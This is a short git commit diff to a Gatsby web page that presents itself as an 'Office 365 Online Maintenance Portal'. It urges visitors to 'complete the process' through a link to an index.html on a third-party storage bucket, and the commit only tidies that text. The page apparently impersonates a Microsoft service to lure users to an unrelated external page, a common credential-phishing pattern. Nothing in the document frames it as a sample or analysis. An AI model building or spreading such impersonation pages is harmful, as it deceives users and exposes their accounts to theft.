21fd06c660355c3e1068dda039074466700eee0a
brianheather <87387671+brianheather@users.noreply.github.com>
2021-07-13 19:09:27 +0100

    Update page-2.js

--- src/pages/page-2.js
+++ src/pages/page-2.js
@@ -8,7 +8,7 @@ const SecondPage = () => (
   <Layout>
     <Seo title="Office 365" />
     <h1>Office 365 Online Maintenance Portal.</h1>
-    <p>Click below to complete the process 2</p>
+    <p>Click below to complete the process</p>
     <Link to="https://edocument.s3.us-west-000.backblazeb2.com/index.html">Office 365 Portal</Link>
   </Layout>
 )
